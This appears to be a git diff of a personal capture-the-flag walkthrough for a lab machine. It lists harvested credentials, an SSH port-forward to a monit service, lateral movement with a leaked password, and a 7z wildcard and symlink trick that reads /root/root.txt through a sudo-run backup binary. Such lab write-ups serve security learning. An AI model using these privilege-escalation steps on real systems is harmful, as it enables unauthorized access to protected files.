@@ -224,8 +224,8 @@ last bytes: `FFD9`
 >[!example]- result
 >![[Pasted image 20250323165125.png]]
 
-# Privilege Exalation
-## Enumeration
+
+# Enumeration 2
 - If we check the config files and enviroment files we can see a credentials to get access to the mysql database, is the same database as before
 >[!example]- Result
 >![[Pasted image 20250323170257.png]]
@@ -241,7 +241,7 @@ Credentials:
 `raj:raj@raj.com:xander`
 `raj:raj@usage.com:xander`
 
-- after looking for something interesting i see this file `.monitrc` and looks like there is a password of a http service running on port 2812, 
+- after looking for something interesting i see this file `~/.monitrc` and looks like there is a password of a http service running on port 2812.
 >[!example]- Result
 >![[Pasted image 20250323180444.png]]
 
@@ -266,4 +266,49 @@ ssh -L 1234:10.10.16.7:2812 dash@10.10.11.18 -i id_rsa
 - perfect now we can get access to this service
 >[!example]- Result
 >![[Pasted image 20250323184532.png]]
+
+# Lateral Movement
+- but this is not the way, at this point i was thinking that i could use this password in order to get authenticated as "xander"
+Creds: `xander:3nc0d3d_pa$$w0rd`
+>[!example]- Result
+>![[Pasted image 20250323192225.png]]
+
+# Enumeración 3
+- Looking for a privilege escalation, if we check sudoers we can see something
+```bash
+sudo -l
+```
+>[!example]- Result
+>![[Pasted image 20250323192658.png]]
+
+- seems like we can manage the service
+```bash
+sudo /usr/bin/usage_management
+```
+>[!example]- Result
+>![[Pasted image 20250323192946.png]]
+
+# Privilege Escalation
+- Checking this binary using [[strings]] we can see how the backup is done
+```bash
+strings /usr/bin/usage_management 
+```
+>[!example]- Result
+>![[Pasted image 20250323195600.png]]
+
+- after looking for some information i found [this](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7z) , seems like we can abuse wildcards
+```bash
+cd /var/www/html
+touch @root.txt
+ln -s /root/root.txt root.txt
+```
+>[!example]- Result
+>![[Pasted image 20250323200030.png]]
+
+- now run the binary, and... 
+```bash
+sudo /usr/bin/usage_management
+```
+>[!example]- Result
+>![[Pasted image 20250323200153.png]]
 
